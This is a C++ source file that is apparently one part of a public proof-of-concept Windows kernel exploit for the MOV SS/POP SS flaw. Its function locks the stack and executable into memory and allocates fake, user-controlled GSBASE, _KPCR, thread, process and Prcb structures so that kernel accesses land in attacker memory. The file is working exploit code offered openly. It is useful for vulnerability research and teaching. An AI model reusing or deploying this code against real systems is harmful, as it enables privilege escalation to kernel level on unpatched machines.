/*
*	Module Name:
*		ps.cpp
*
*	Abstract:
*		Generic process manipulation routines.
*
*	Authors:
*		Nick Peterson <everdox@gmail.com> | http://everdox.net/
*		Nemanja (Nemi) Mulasmajic <nm@triplefault.io> | http://triplefault.io/
*
*/

#include "stdafx.h"
#include "ps.h"
#include "movss_popss.h"
#include "mm.h"

#define TARGET_MEMORY_SIZE		((size_t)0x10000)
#define WORKING_SET_SIZE		(10000 * PAGE_SIZE)

/*
*	Increase the process working set size and setup the spoofed GSBASE.
*/
bool PsPrepareProcess()
{
	// Increase the process working set size: this allows for more pages in this
	// process to be held in RAM.
	SIZE_T Minimum = 0, Maximum = 0;
	GetProcessWorkingSetSize(NtCurrentProcess(), &Minimum, &Maximum);
	pprintf("Current working set: { 0x%zx, 0x%zx } bytes.\n", Minimum, Maximum);

	SetProcessWorkingSetSize(NtCurrentProcess(), WORKING_SET_SIZE, WORKING_SET_SIZE);

	GetProcessWorkingSetSize(NtCurrentProcess(), &Minimum, &Maximum);
	pprintf("Adjusted working set: { 0x%zx, 0x%zx } bytes.\n", Minimum, Maximum);

	// We need to make sure CPU0's stack doesn't get paged out randomly... 
	// otherwise we'll hit the double fault handler.
	PTEB_INTERNAL Teb = (PTEB_INTERNAL)NtCurrentTeb();
	pprintf("Paging stack into memory: 0x%p-0x%p.\n", Teb->NtTib.StackLimit, Teb->NtTib.StackBase);
	MmProbeAndLockPages(Teb->NtTib.StackLimit, (size_t)((uintptr_t)Teb->NtTib.StackBase - (uintptr_t)Teb->NtTib.StackLimit));

	// Since we control GSBASE from usermode, we need to insert fake values 
	// into it so that when they are accessed during normal kernel operations 
	// they exist and are valid.

	// Create our spoofed/user-controlled GSBASE.
	pprintf("_KPCR: Allocating memory for user-controlled GS base.\n");

	_SpoofedGSBase = (PBYTE)VirtualAlloc(NULL, TARGET_MEMORY_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!_SpoofedGSBase)
	{
		pprintf("ERROR: Memory allocation failure. Code: %u.\n", GetLastError());
		return false;
	}

	pprintf("_KPCR: New GS base at 0x%p.\n", _SpoofedGSBase);

	MmProbeAndLockPages(_SpoofedGSBase, TARGET_MEMORY_SIZE);

	// _KPCR.Prcb.CurrentThread pointer needs to be valid.
	pprintf("_KPCR.Prcb.CurrentThread: Allocating memory for user-controlled thread.\n");

	_SpoofedCurrentThread = (PBYTE)VirtualAlloc(NULL, TARGET_MEMORY_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!_SpoofedCurrentThread)
	{
		pprintf("ERROR: Memory allocation failure. Code: %u.\n", GetLastError());
		return false;
	}

	pprintf("_KPCR.Prcb.CurrentThread: Current thread at 0x%p.\n", _SpoofedCurrentThread);

	MmProbeAndLockPages(_SpoofedCurrentThread, TARGET_MEMORY_SIZE);

	// _KPCR.Prcb.CurrentThread->ApcState.Process needs to be valid.
	pprintf("_KTHREAD.ApcState.Process: Allocating memory for user-controlled process.\n");

	_SpoofedCurrentProcess = (PBYTE)VirtualAlloc(NULL, TARGET_MEMORY_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!_SpoofedCurrentProcess)
	{
		pprintf("ERROR: Memory allocation failure. Code: %u.\n", GetLastError());
		return false;
	}

	pprintf("_KTHREAD.ApcState.Process: Current process at 0x%p.\n", _SpoofedCurrentProcess);

	MmProbeAndLockPages(_SpoofedCurrentProcess, TARGET_MEMORY_SIZE);

	// _KPCR.CurrentPrcb needs to be valid.
	pprintf("_KPCR.CurrentPrcb: Allocation memory for user-controlled processor control region.\n");

	_SpoofedPrcb = (PBYTE)VirtualAlloc(NULL, TARGET_MEMORY_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!_SpoofedPrcb)
	{
		pprintf("ERROR: Memory allocation failure. Code: %u.\n", GetLastError());
		return false;
	}

	pprintf("_KPCR.CurrentPrcb: Processor control region at 0x%p.\n", _SpoofedPrcb);

	MmProbeAndLockPages(_SpoofedPrcb, TARGET_MEMORY_SIZE);

	// Make sure the rest of the EXE (exploit.exe) stays paged into memory.
	MODULEINFO ModuleInfo;
	GetModuleInformation(NtCurrentProcess(), (HMODULE)&__ImageBase, &ModuleInfo, sizeof(ModuleInfo));

	MmProbeAndLockPages(ModuleInfo.lpBaseOfDll, ModuleInfo.SizeOfImage);

	pprintf("Paging executable into memory: 0x%p-0x%p.\n", ModuleInfo.lpBaseOfDll, (PVOID)((uintptr_t)ModuleInfo.lpBaseOfDll + ModuleInfo.SizeOfImage));

	return true;
}
